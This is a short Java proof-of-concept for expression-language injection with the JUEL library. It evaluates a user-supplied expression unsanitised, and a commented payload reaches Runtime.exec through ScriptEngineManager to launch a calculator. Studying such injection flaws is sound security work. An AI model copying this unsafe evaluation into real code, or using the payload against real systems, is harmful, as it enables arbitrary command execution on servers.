package com.SugarP1g.elInjection;

import de.odysseus.el.ExpressionFactoryImpl;
import de.odysseus.el.util.SimpleContext;

import javax.el.ExpressionFactory;
import javax.el.ValueExpression;

public class POC {

    public static void main(String[] args) {
        String exp = args[1];
        // String exp = "${''.getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"java.lang.Runtime.getRuntime().exec('calc')\")}";
        ExpressionFactory expressionFactory = new ExpressionFactoryImpl();
        SimpleContext simpleContext = new SimpleContext();
        ValueExpression valueExpression = expressionFactory.createValueExpression(simpleContext, exp, String.class);
        System.out.println(valueExpression.getValue(simpleContext));
    }
}
